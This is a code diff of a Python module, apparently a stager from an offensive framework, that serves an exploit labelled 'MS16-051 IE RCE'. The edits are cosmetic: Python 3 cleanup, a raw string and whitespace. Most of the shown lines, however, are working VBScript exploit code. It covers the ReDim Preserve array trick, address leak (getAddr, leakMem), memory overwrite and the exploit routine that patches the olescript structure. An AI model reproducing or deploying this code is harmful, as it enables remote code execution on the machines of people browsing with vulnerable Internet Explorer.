@@ -1,12 +1,10 @@
-from __future__ import print_function
-
 import logging
 
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "MS16-051 IE RCE",
             "Authors": [
@@ -79,7 +77,7 @@ class Stager(object):
                 "Value": "default",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
             },
@@ -91,11 +89,6 @@ class Stager(object):
         }
 
         self.mainMenu = mainMenu
-
-        for param in params:
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
 
     def generate(self):
         # extract all of our options
@@ -169,31 +162,31 @@ class Stager(object):
         b = String(64000, "D")
         c = d & b
         x = UnEscape(c)
-        
+
         Class ArrayWrapper
             Dim A()
             Private Sub Class_Initialize
                   ReDim Preserve A(1, 2000)
             End Sub
-            
+
             Public Sub Resize()
                 ReDim Preserve A(1, 1)
             End Sub
         End Class
-        
+
         Class Dummy
         End Class
-        
+
         Function getAddr (arg1, s)
             aw = Null
             Set aw = New ArrayWrapper
-        
+
             For i = 0 To 32
                 Set plunge(i) = s
             Next
-        
+
             Set aw.A(arg1, 2) = s
-        
+
             Dim addr
             Dim i
             For i = 0 To 31
@@ -202,54 +195,54 @@ class Stager(object):
                 End If
                 y(i) = Null
             Next
-        
+
             If addr = Null Then
                 document.location.href = document.location.href
                 Return
             End If
             getAddr = addr
         End Function
-        
+
         Function leakMem (arg1, addr)
             d = prefix & "%u0008%u4141%u4141%u4141"
             c = d & intToStr(addr) & b
             x = UnEscape(c)
-        
+
             aw = Null
             Set aw = New ArrayWrapper
-        
+
             Dim o
             o = aw.A(arg1, 2)
-        
+
             leakMem = o
         End Function
-        
+
         Sub overwrite (arg1, addr)
             d = prefix & "%u400C%u0000%u0000%u0000"
             c = d & intToStr(addr) & b
             x = UnEscape(c)
-        
+
             aw = Null
             Set aw = New ArrayWrapper
-        
-        
+
+
             aw.A(arg1, 2) = CSng(0)
         End Sub
-        
+
         Function exploit (arg1)
             Dim addr
             Dim csession
             Dim olescript
             Dim mem
-        
-        
+
+
             Set dm = New Dummy
-        
+
             addr = getAddr(arg1, dm)
-        
+
             mem = leakMem(arg1, addr + 8)
             csession = strToInt(Mid(mem, 3, 2))
-        
+
             mem = leakMem(arg1, csession + 4)
             olescript = strToInt(Mid(mem, 1, 2))
             overwrite arg1, olescript + &H174
@@ -266,7 +259,7 @@ class Stager(object):
             Next
         End Function
     </script>
-        
+
     <script type="text/javascript">
         function strToInt(s)
         {{
